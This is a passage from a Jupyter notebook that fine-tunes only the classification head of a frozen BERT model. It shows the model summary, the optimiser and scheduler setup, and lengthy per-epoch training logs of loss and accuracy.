      "text/plain": "BertForSequenceClassification(\n  (bert): BertModel(\n    (embeddings): BertEmbeddings(\n      (word_embeddings): Embedding(30522, 768, padding_idx=0)\n      (position_embeddings): Embedding(512, 768)\n      (token_type_embeddings): Embedding(2, 768)\n      (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n      (dropout): Dropout(p=0.1, inplace=False)\n    )\n    (encoder): BertEncoder(\n      (layer): ModuleList(\n        (0-11): 12 x BertLayer(\n          (attention): BertAttention(\n            (self): BertSelfAttention(\n              (query): Linear(in_features=768, out_features=768, bias=True)\n              (key): Linear(in_features=768, out_features=768, bias=True)\n              (value): Linear(in_features=768, out_features=768, bias=True)\n              (dropout): Dropout(p=0.1, inplace=False)\n            )\n            (output): BertSelfOutput(\n              (dense): Linear(in_features=768, out_features=768, bias=True)\n              (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n              (dropout): Dropout(p=0.1, inplace=False)\n            )\n          )\n          (intermediate): BertIntermediate(\n            (dense): Linear(in_features=768, out_features=3072, bias=True)\n            (intermediate_act_fn): GELUActivation()\n          )\n          (output): BertOutput(\n            (dense): Linear(in_features=3072, out_features=768, bias=True)\n            (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n            (dropout): Dropout(p=0.1, inplace=False)\n          )\n        )\n      )\n    )\n    (pooler): BertPooler(\n      (dense): Linear(in_features=768, out_features=768, bias=True)\n      (activation): Tanh()\n    )\n  )\n  (dropout): Dropout(p=0.1, inplace=False)\n  (classifier): Linear(in_features=768, out_features=2, bias=True)\n)"
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import torchinfo\n",
    "device = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')\n",
    "model.to(device)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:21.501126700Z",
     "start_time": "2024-05-30T14:30:21.122190100Z"
    }
   },
   "id": "aacae626aeba7918"
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bert.embeddings.word_embeddings.weight : False\n",
      "bert.embeddings.position_embeddings.weight : False\n",
      "bert.embeddings.token_type_embeddings.weight : False\n",
      "bert.embeddings.LayerNorm.weight : False\n",
      "bert.embeddings.LayerNorm.bias : False\n",
      "bert.encoder.layer.0.attention.self.query.weight : False\n",
      "bert.encoder.layer.0.attention.self.query.bias : False\n",
      "bert.encoder.layer.0.attention.self.key.weight : False\n",
      "bert.encoder.layer.0.attention.self.key.bias : False\n",
      "bert.encoder.layer.0.attention.self.value.weight : False\n",
      "bert.encoder.layer.0.attention.self.value.bias : False\n",
      "bert.encoder.layer.0.attention.output.dense.weight : False\n",
      "bert.encoder.layer.0.attention.output.dense.bias : False\n",
      "bert.encoder.layer.0.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.0.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.0.intermediate.dense.weight : False\n",
      "bert.encoder.layer.0.intermediate.dense.bias : False\n",
      "bert.encoder.layer.0.output.dense.weight : False\n",
      "bert.encoder.layer.0.output.dense.bias : False\n",
      "bert.encoder.layer.0.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.0.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.1.attention.self.query.weight : False\n",
      "bert.encoder.layer.1.attention.self.query.bias : False\n",
      "bert.encoder.layer.1.attention.self.key.weight : False\n",
      "bert.encoder.layer.1.attention.self.key.bias : False\n",
      "bert.encoder.layer.1.attention.self.value.weight : False\n",
      "bert.encoder.layer.1.attention.self.value.bias : False\n",
      "bert.encoder.layer.1.attention.output.dense.weight : False\n",
      "bert.encoder.layer.1.attention.output.dense.bias : False\n",
      "bert.encoder.layer.1.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.1.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.1.intermediate.dense.weight : False\n",
      "bert.encoder.layer.1.intermediate.dense.bias : False\n",
      "bert.encoder.layer.1.output.dense.weight : False\n",
      "bert.encoder.layer.1.output.dense.bias : False\n",
      "bert.encoder.layer.1.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.1.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.2.attention.self.query.weight : False\n",
      "bert.encoder.layer.2.attention.self.query.bias : False\n",
      "bert.encoder.layer.2.attention.self.key.weight : False\n",
      "bert.encoder.layer.2.attention.self.key.bias : False\n",
      "bert.encoder.layer.2.attention.self.value.weight : False\n",
      "bert.encoder.layer.2.attention.self.value.bias : False\n",
      "bert.encoder.layer.2.attention.output.dense.weight : False\n",
      "bert.encoder.layer.2.attention.output.dense.bias : False\n",
      "bert.encoder.layer.2.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.2.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.2.intermediate.dense.weight : False\n",
      "bert.encoder.layer.2.intermediate.dense.bias : False\n",
      "bert.encoder.layer.2.output.dense.weight : False\n",
      "bert.encoder.layer.2.output.dense.bias : False\n",
      "bert.encoder.layer.2.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.2.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.3.attention.self.query.weight : False\n",
      "bert.encoder.layer.3.attention.self.query.bias : False\n",
      "bert.encoder.layer.3.attention.self.key.weight : False\n",
      "bert.encoder.layer.3.attention.self.key.bias : False\n",
      "bert.encoder.layer.3.attention.self.value.weight : False\n",
      "bert.encoder.layer.3.attention.self.value.bias : False\n",
      "bert.encoder.layer.3.attention.output.dense.weight : False\n",
      "bert.encoder.layer.3.attention.output.dense.bias : False\n",
      "bert.encoder.layer.3.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.3.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.3.intermediate.dense.weight : False\n",
      "bert.encoder.layer.3.intermediate.dense.bias : False\n",
      "bert.encoder.layer.3.output.dense.weight : False\n",
      "bert.encoder.layer.3.output.dense.bias : False\n",
      "bert.encoder.layer.3.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.3.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.4.attention.self.query.weight : False\n",
      "bert.encoder.layer.4.attention.self.query.bias : False\n",
      "bert.encoder.layer.4.attention.self.key.weight : False\n",
      "bert.encoder.layer.4.attention.self.key.bias : False\n",
      "bert.encoder.layer.4.attention.self.value.weight : False\n",
      "bert.encoder.layer.4.attention.self.value.bias : False\n",
      "bert.encoder.layer.4.attention.output.dense.weight : False\n",
      "bert.encoder.layer.4.attention.output.dense.bias : False\n",
      "bert.encoder.layer.4.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.4.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.4.intermediate.dense.weight : False\n",
      "bert.encoder.layer.4.intermediate.dense.bias : False\n",
      "bert.encoder.layer.4.output.dense.weight : False\n",
      "bert.encoder.layer.4.output.dense.bias : False\n",
      "bert.encoder.layer.4.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.4.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.5.attention.self.query.weight : False\n",
      "bert.encoder.layer.5.attention.self.query.bias : False\n",
      "bert.encoder.layer.5.attention.self.key.weight : False\n",
      "bert.encoder.layer.5.attention.self.key.bias : False\n",
      "bert.encoder.layer.5.attention.self.value.weight : False\n",
      "bert.encoder.layer.5.attention.self.value.bias : False\n",
      "bert.encoder.layer.5.attention.output.dense.weight : False\n",
      "bert.encoder.layer.5.attention.output.dense.bias : False\n",
      "bert.encoder.layer.5.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.5.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.5.intermediate.dense.weight : False\n",
      "bert.encoder.layer.5.intermediate.dense.bias : False\n",
      "bert.encoder.layer.5.output.dense.weight : False\n",
      "bert.encoder.layer.5.output.dense.bias : False\n",
      "bert.encoder.layer.5.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.5.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.6.attention.self.query.weight : False\n",
      "bert.encoder.layer.6.attention.self.query.bias : False\n",
      "bert.encoder.layer.6.attention.self.key.weight : False\n",
      "bert.encoder.layer.6.attention.self.key.bias : False\n",
      "bert.encoder.layer.6.attention.self.value.weight : False\n",
      "bert.encoder.layer.6.attention.self.value.bias : False\n",
      "bert.encoder.layer.6.attention.output.dense.weight : False\n",
      "bert.encoder.layer.6.attention.output.dense.bias : False\n",
      "bert.encoder.layer.6.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.6.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.6.intermediate.dense.weight : False\n",
      "bert.encoder.layer.6.intermediate.dense.bias : False\n",
      "bert.encoder.layer.6.output.dense.weight : False\n",
      "bert.encoder.layer.6.output.dense.bias : False\n",
      "bert.encoder.layer.6.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.6.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.7.attention.self.query.weight : False\n",
      "bert.encoder.layer.7.attention.self.query.bias : False\n",
      "bert.encoder.layer.7.attention.self.key.weight : False\n",
      "bert.encoder.layer.7.attention.self.key.bias : False\n",
      "bert.encoder.layer.7.attention.self.value.weight : False\n",
      "bert.encoder.layer.7.attention.self.value.bias : False\n",
      "bert.encoder.layer.7.attention.output.dense.weight : False\n",
      "bert.encoder.layer.7.attention.output.dense.bias : False\n",
      "bert.encoder.layer.7.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.7.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.7.intermediate.dense.weight : False\n",
      "bert.encoder.layer.7.intermediate.dense.bias : False\n",
      "bert.encoder.layer.7.output.dense.weight : False\n",
      "bert.encoder.layer.7.output.dense.bias : False\n",
      "bert.encoder.layer.7.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.7.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.8.attention.self.query.weight : False\n",
      "bert.encoder.layer.8.attention.self.query.bias : False\n",
      "bert.encoder.layer.8.attention.self.key.weight : False\n",
      "bert.encoder.layer.8.attention.self.key.bias : False\n",
      "bert.encoder.layer.8.attention.self.value.weight : False\n",
      "bert.encoder.layer.8.attention.self.value.bias : False\n",
      "bert.encoder.layer.8.attention.output.dense.weight : False\n",
      "bert.encoder.layer.8.attention.output.dense.bias : False\n",
      "bert.encoder.layer.8.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.8.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.8.intermediate.dense.weight : False\n",
      "bert.encoder.layer.8.intermediate.dense.bias : False\n",
      "bert.encoder.layer.8.output.dense.weight : False\n",
      "bert.encoder.layer.8.output.dense.bias : False\n",
      "bert.encoder.layer.8.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.8.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.9.attention.self.query.weight : False\n",
      "bert.encoder.layer.9.attention.self.query.bias : False\n",
      "bert.encoder.layer.9.attention.self.key.weight : False\n",
      "bert.encoder.layer.9.attention.self.key.bias : False\n",
      "bert.encoder.layer.9.attention.self.value.weight : False\n",
      "bert.encoder.layer.9.attention.self.value.bias : False\n",
      "bert.encoder.layer.9.attention.output.dense.weight : False\n",
      "bert.encoder.layer.9.attention.output.dense.bias : False\n",
      "bert.encoder.layer.9.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.9.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.9.intermediate.dense.weight : False\n",
      "bert.encoder.layer.9.intermediate.dense.bias : False\n",
      "bert.encoder.layer.9.output.dense.weight : False\n",
      "bert.encoder.layer.9.output.dense.bias : False\n",
      "bert.encoder.layer.9.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.9.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.10.attention.self.query.weight : False\n",
      "bert.encoder.layer.10.attention.self.query.bias : False\n",
      "bert.encoder.layer.10.attention.self.key.weight : False\n",
      "bert.encoder.layer.10.attention.self.key.bias : False\n",
      "bert.encoder.layer.10.attention.self.value.weight : False\n",
      "bert.encoder.layer.10.attention.self.value.bias : False\n",
      "bert.encoder.layer.10.attention.output.dense.weight : False\n",
      "bert.encoder.layer.10.attention.output.dense.bias : False\n",
      "bert.encoder.layer.10.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.10.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.10.intermediate.dense.weight : False\n",
      "bert.encoder.layer.10.intermediate.dense.bias : False\n",
      "bert.encoder.layer.10.output.dense.weight : False\n",
      "bert.encoder.layer.10.output.dense.bias : False\n",
      "bert.encoder.layer.10.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.10.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.11.attention.self.query.weight : False\n",
      "bert.encoder.layer.11.attention.self.query.bias : False\n",
      "bert.encoder.layer.11.attention.self.key.weight : False\n",
      "bert.encoder.layer.11.attention.self.key.bias : False\n",
      "bert.encoder.layer.11.attention.self.value.weight : False\n",
      "bert.encoder.layer.11.attention.self.value.bias : False\n",
      "bert.encoder.layer.11.attention.output.dense.weight : False\n",
      "bert.encoder.layer.11.attention.output.dense.bias : False\n",
      "bert.encoder.layer.11.attention.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.11.attention.output.LayerNorm.bias : False\n",
      "bert.encoder.layer.11.intermediate.dense.weight : False\n",
      "bert.encoder.layer.11.intermediate.dense.bias : False\n",
      "bert.encoder.layer.11.output.dense.weight : False\n",
      "bert.encoder.layer.11.output.dense.bias : False\n",
      "bert.encoder.layer.11.output.LayerNorm.weight : False\n",
      "bert.encoder.layer.11.output.LayerNorm.bias : False\n",
      "bert.pooler.dense.weight : False\n",
      "bert.pooler.dense.bias : False\n",
      "classifier.weight : True\n",
      "classifier.bias : True\n"
     ]
    }
   ],
   "source": [
    "for name,param in model.named_parameters():\n",
    "    param.requires_grad = False\n",
    "    if name == 'classifier.weight' or name == 'classifier.bias':\n",
    "        param.requires_grad = True\n",
    "    print(f'{name} : {param.requires_grad}')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:23.455090900Z",
     "start_time": "2024-05-30T14:30:23.434697Z"
    }
   },
   "id": "f7148bf139a050ae"
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "outputs": [],
   "source": [
    "optimizer = torch.optim.Adam(model.parameters(), lr=2e-3)\n",
    "loss_fn = torch.nn.CrossEntropyLoss().to(device)\n",
    "scheduler = torch.optim.lr_scheduler.ReduceLROnPlateau(\n",
    "    optimizer = optimizer,\n",
    "    mode = 'max',\n",
    "    factor = 0.7,\n",
    "    patience = 100,\n",
    "    min_lr = 1e-10,\n",
    "    verbose = True\n",
    ")"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:25.844033500Z",
     "start_time": "2024-05-30T14:30:25.834079200Z"
    }
   },
   "id": "37a6724b91423bf"
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "outputs": [
    {
     "data": {
      "text/plain": "  0%|          | 0/10 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "d65c168292e4405d864c25d6bb069d1b"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "5e59c1e3041344b49ff45ce6afbbd71a"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.696740448474884 Accuracy : 0.5625\n",
      "Epoch : 10 Loss : 0.6536101698875427 Accuracy : 0.640625\n",
      "Epoch : 20 Loss : 0.46376994252204895 Accuracy : 0.75\n",
      "Epoch : 30 Loss : 0.45184677839279175 Accuracy : 0.84375\n",
      "Epoch : 40 Loss : 0.45249608159065247 Accuracy : 0.78125\n",
      "Epoch : 50 Loss : 0.432345449924469 Accuracy : 0.765625\n",
      "Epoch : 60 Loss : 0.4343608021736145 Accuracy : 0.796875\n",
      "Epoch : 70 Loss : 0.3289657533168793 Accuracy : 0.875\n",
      "Epoch : 80 Loss : 0.42952990531921387 Accuracy : 0.8125\n",
      "Epoch : 90 Loss : 0.30268925428390503 Accuracy : 0.90625\n",
      "Epoch : 100 Loss : 0.33819514513015747 Accuracy : 0.84375\n",
      "Epoch : 110 Loss : 0.32685938477516174 Accuracy : 0.875\n",
      "Epoch : 120 Loss : 0.26948779821395874 Accuracy : 0.9375\n",
      "Epoch : 130 Loss : 0.2908341586589813 Accuracy : 0.90625\n",
      "Epoch : 140 Loss : 0.31309446692466736 Accuracy : 0.890625\n",
      "Epoch : 150 Loss : 0.3325822055339813 Accuracy : 0.84375\n",
      "Epoch : 160 Loss : 0.2604334056377411 Accuracy : 0.90625\n",
      "Epoch : 170 Loss : 0.24694888293743134 Accuracy : 0.90625\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "6fbb38d3e34249a1809f0223551c0957"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.265019029378891 Accuracy : 0.890625\n",
      "Epoch : 10 Loss : 0.23440277576446533 Accuracy : 0.953125\n",
      "Epoch : 20 Loss : 0.20050545036792755 Accuracy : 0.953125\n",
      "Epoch : 30 Loss : 0.36219629645347595 Accuracy : 0.84375\n",
      "Epoch : 40 Loss : 0.29752135276794434 Accuracy : 0.84375\n",
      "Epoch : 50 Loss : 0.2079610675573349 Accuracy : 0.953125\n",
      "Epoch : 60 Loss : 0.21385058760643005 Accuracy : 0.921875\n",
      "Epoch : 70 Loss : 0.2975670397281647 Accuracy : 0.90625\n",
      "Epoch : 80 Loss : 0.3010426461696625 Accuracy : 0.859375\n",
      "Epoch : 90 Loss : 0.2321506291627884 Accuracy : 0.90625\n",
      "Epoch 00273: reducing learning rate of group 0 to 1.4000e-03.\n",
      "Epoch : 100 Loss : 0.27785027027130127 Accuracy : 0.921875\n",
      "Epoch : 110 Loss : 0.24099113047122955 Accuracy : 0.9375\n",
      "Epoch : 120 Loss : 0.21300598978996277 Accuracy : 0.953125\n",
      "Epoch : 130 Loss : 0.20316460728645325 Accuracy : 0.9375\n",
      "Epoch : 140 Loss : 0.2060614377260208 Accuracy : 0.9375\n",
      "Epoch : 150 Loss : 0.20027391612529755 Accuracy : 0.921875\n",
      "Epoch : 160 Loss : 0.1827419251203537 Accuracy : 0.953125\n",
      "Epoch : 170 Loss : 0.2234238088130951 Accuracy : 0.9375\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "8a2d695ec1cc4ad6b8e5e454bc450b67"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.23408779501914978 Accuracy : 0.921875\n",
      "Epoch : 10 Loss : 0.199175164103508 Accuracy : 0.9375\n",
      "Epoch : 20 Loss : 0.2138514220714569 Accuracy : 0.921875\n",
      "Epoch 00374: reducing learning rate of group 0 to 9.8000e-04.\n",
      "Epoch : 30 Loss : 0.19425126910209656 Accuracy : 0.953125\n",
      "Epoch : 40 Loss : 0.2723550796508789 Accuracy : 0.890625\n",
      "Epoch : 50 Loss : 0.20932325720787048 Accuracy : 0.921875\n",
      "Epoch : 60 Loss : 0.19315564632415771 Accuracy : 0.953125\n",
      "Epoch : 70 Loss : 0.1927013099193573 Accuracy : 0.921875\n",
      "Epoch : 80 Loss : 0.16582635045051575 Accuracy : 0.9375\n",
      "Epoch : 90 Loss : 0.20679576694965363 Accuracy : 0.921875\n",
      "Epoch : 100 Loss : 0.18066205084323883 Accuracy : 0.9375\n",
      "Epoch : 110 Loss : 0.2022087574005127 Accuracy : 0.921875\n",
      "Epoch : 120 Loss : 0.1321195513010025 Accuracy : 0.96875\n",
      "Epoch 00475: reducing learning rate of group 0 to 6.8600e-04.\n",
      "Epoch : 130 Loss : 0.18665102124214172 Accuracy : 0.9375\n",
      "Epoch : 140 Loss : 0.18858005106449127 Accuracy : 0.953125\n",
      "Epoch : 150 Loss : 0.15338356792926788 Accuracy : 0.96875\n",
      "Epoch : 160 Loss : 0.2773897349834442 Accuracy : 0.90625\n",
      "Epoch : 170 Loss : 0.155203178524971 Accuracy : 0.96875\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "21748cdeb95b4353872dd0d9bdaf84f7"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.13965703547000885 Accuracy : 0.96875\n",
      "Epoch : 10 Loss : 0.14463914930820465 Accuracy : 0.921875\n",
      "Epoch : 20 Loss : 0.21304358541965485 Accuracy : 0.90625\n",
      "Epoch : 30 Loss : 0.16199640929698944 Accuracy : 0.953125\n",
      "Epoch : 40 Loss : 0.1961517482995987 Accuracy : 0.953125\n",
      "Epoch : 50 Loss : 0.18940715491771698 Accuracy : 0.90625\n",
      "Epoch 00576: reducing learning rate of group 0 to 4.8020e-04.\n",
      "Epoch : 60 Loss : 0.18205927312374115 Accuracy : 0.921875\n",
      "Epoch : 70 Loss : 0.15133719146251678 Accuracy : 0.953125\n",
      "Epoch : 80 Loss : 0.18532343208789825 Accuracy : 0.9375\n",
      "Epoch : 90 Loss : 0.16719241440296173 Accuracy : 0.953125\n",
      "Epoch : 100 Loss : 0.17895513772964478 Accuracy : 0.953125\n",
      "Epoch : 110 Loss : 0.14664456248283386 Accuracy : 0.96875\n",
      "Epoch : 120 Loss : 0.1346493810415268 Accuracy : 0.984375\n",
      "Epoch : 130 Loss : 0.22503161430358887 Accuracy : 0.9375\n",
      "Epoch : 140 Loss : 0.2033219337463379 Accuracy : 0.890625\n",
      "Epoch : 150 Loss : 0.17920111119747162 Accuracy : 0.921875\n",
      "Epoch 00677: reducing learning rate of group 0 to 3.3614e-04.\n",
      "Epoch : 160 Loss : 0.15590888261795044 Accuracy : 0.953125\n",
      "Epoch : 170 Loss : 0.0807526558637619 Accuracy : 1.0\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "b54a59c3ee854af1bb9719a1767c2cca"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.22153480350971222 Accuracy : 0.9375\n",
      "Epoch : 10 Loss : 0.19108735024929047 Accuracy : 0.9375\n",
      "Epoch : 20 Loss : 0.1729866862297058 Accuracy : 0.953125\n",
      "Epoch : 30 Loss : 0.16514135897159576 Accuracy : 0.9375\n",
      "Epoch : 40 Loss : 0.18900997936725616 Accuracy : 0.9375\n",
      "Epoch : 50 Loss : 0.1331392377614975 Accuracy : 0.96875\n",
      "Epoch : 60 Loss : 0.11447247117757797 Accuracy : 0.96875\n",
      "Epoch : 70 Loss : 0.17953252792358398 Accuracy : 0.96875\n",
      "Epoch : 80 Loss : 0.16954073309898376 Accuracy : 0.921875\n",
      "Epoch 00778: reducing learning rate of group 0 to 2.3530e-04.\n",
      "Epoch : 90 Loss : 0.2530677616596222 Accuracy : 0.90625\n",
      "Epoch : 100 Loss : 0.2893383204936981 Accuracy : 0.9375\n",
      "Epoch : 110 Loss : 0.11310264468193054 Accuracy : 0.984375\n",
      "Epoch : 120 Loss : 0.1830676943063736 Accuracy : 0.9375\n",
      "Epoch : 130 Loss : 0.18694031238555908 Accuracy : 0.90625\n",
      "Epoch : 140 Loss : 0.1552710235118866 Accuracy : 0.921875\n",
      "Epoch : 150 Loss : 0.10042008012533188 Accuracy : 1.0\n",
      "Epoch : 160 Loss : 0.14294859766960144 Accuracy : 0.96875\n",
      "Epoch : 170 Loss : 0.1716739535331726 Accuracy : 0.953125\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "8c8fb4b74da84017b871df1632ac9ad8"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.20754428207874298 Accuracy : 0.9375\n",
      "Epoch : 10 Loss : 0.226792111992836 Accuracy : 0.921875\n",
      "Epoch 00879: reducing learning rate of group 0 to 1.6471e-04.\n",
      "Epoch : 20 Loss : 0.1282397210597992 Accuracy : 0.953125\n",
      "Epoch : 30 Loss : 0.18245849013328552 Accuracy : 0.953125\n",
      "Epoch : 40 Loss : 0.20699194073677063 Accuracy : 0.953125\n",
      "Epoch : 50 Loss : 0.126979798078537 Accuracy : 0.953125\n",
      "Epoch : 60 Loss : 0.1937960386276245 Accuracy : 0.921875\n",
      "Epoch : 70 Loss : 0.15828052163124084 Accuracy : 0.953125\n",
      "Epoch : 80 Loss : 0.19229136407375336 Accuracy : 0.96875\n",
      "Epoch : 90 Loss : 0.17855305969715118 Accuracy : 0.953125\n",
      "Epoch : 100 Loss : 0.1542852520942688 Accuracy : 0.96875\n",
      "Epoch : 110 Loss : 0.13965077698230743 Accuracy : 0.953125\n",
      "Epoch 00980: reducing learning rate of group 0 to 1.1530e-04.\n",
      "Epoch : 120 Loss : 0.21689553558826447 Accuracy : 0.921875\n",
      "Epoch : 130 Loss : 0.2663828134536743 Accuracy : 0.953125\n",
      "Epoch : 140 Loss : 0.2199462205171585 Accuracy : 0.921875\n",
      "Epoch : 150 Loss : 0.15635520219802856 Accuracy : 0.953125\n",
      "Epoch : 160 Loss : 0.12674081325531006 Accuracy : 0.96875\n",
      "Epoch : 170 Loss : 0.12881843745708466 Accuracy : 0.984375\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "7af91e9170bd4e62b49d674c7573d708"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.17588946223258972 Accuracy : 0.90625\n",
      "Epoch : 10 Loss : 0.25297194719314575 Accuracy : 0.90625\n",
      "Epoch : 20 Loss : 0.11898903548717499 Accuracy : 0.96875\n",
      "Epoch : 30 Loss : 0.19314457476139069 Accuracy : 0.921875\n",
      "Epoch : 40 Loss : 0.14857041835784912 Accuracy : 0.953125\n",
      "Epoch 01081: reducing learning rate of group 0 to 8.0707e-05.\n",
      "Epoch : 50 Loss : 0.22749672830104828 Accuracy : 0.921875\n",
      "Epoch : 60 Loss : 0.23841926455497742 Accuracy : 0.921875\n",
      "Epoch : 70 Loss : 0.18847474455833435 Accuracy : 0.9375\n",
      "Epoch : 80 Loss : 0.1981467455625534 Accuracy : 0.953125\n",
      "Epoch : 90 Loss : 0.14491616189479828 Accuracy : 0.9375\n",
      "Epoch : 100 Loss : 0.19403858482837677 Accuracy : 0.9375\n",
      "Epoch : 110 Loss : 0.17739742994308472 Accuracy : 0.96875\n",
      "Epoch : 120 Loss : 0.13018660247325897 Accuracy : 0.96875\n",
      "Epoch : 130 Loss : 0.1441718190908432 Accuracy : 0.984375\n",
      "Epoch : 140 Loss : 0.283770889043808 Accuracy : 0.890625\n",
      "Epoch 01182: reducing learning rate of group 0 to 5.6495e-05.\n",
      "Epoch : 150 Loss : 0.12651607394218445 Accuracy : 1.0\n",
      "Epoch : 160 Loss : 0.2454403191804886 Accuracy : 0.890625\n",
      "Epoch : 170 Loss : 0.12647783756256104 Accuracy : 0.96875\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "85bcb0eb9e43472880af2498ee3866c9"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.1791515350341797 Accuracy : 0.921875\n",
      "Epoch : 10 Loss : 0.2547945976257324 Accuracy : 0.890625\n",
      "Epoch : 20 Loss : 0.15049271285533905 Accuracy : 0.953125\n",
      "Epoch : 30 Loss : 0.12170278280973434 Accuracy : 0.953125\n",
      "Epoch : 40 Loss : 0.10600526630878448 Accuracy : 0.96875\n",
      "Epoch : 50 Loss : 0.15778781473636627 Accuracy : 0.9375\n",
      "Epoch : 60 Loss : 0.1807401478290558 Accuracy : 0.9375\n",
      "Epoch : 70 Loss : 0.27345162630081177 Accuracy : 0.921875\n",
      "Epoch 01283: reducing learning rate of group 0 to 3.9547e-05.\n",
      "Epoch : 80 Loss : 0.14093658328056335 Accuracy : 0.96875\n",
      "Epoch : 90 Loss : 0.2897850573062897 Accuracy : 0.90625\n",
      "Epoch : 100 Loss : 0.14116905629634857 Accuracy : 0.96875\n",
